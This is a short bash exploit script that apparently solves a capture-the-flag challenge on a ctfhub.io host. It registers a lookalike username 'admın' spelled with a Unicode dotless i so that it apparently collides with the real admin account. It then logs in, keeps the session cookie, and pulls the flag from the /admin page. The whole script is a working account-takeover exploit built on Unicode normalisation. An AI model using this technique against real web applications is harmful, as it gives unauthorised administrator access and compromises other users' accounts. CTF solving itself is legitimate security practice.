#!/bin/bash
set -e

TARGET="https://2cat0a0mm8d8.ctfhub.io"
PASS="test123"

USER=$(printf 'adm\u0131n')

curl -s -L -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/register" >/dev/null

curl -s -L -c /tmp/c.txt -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/login" >/dev/null

curl -s -b /tmp/c.txt "$TARGET/admin" | grep -oE "flag\{[^}]+\}"
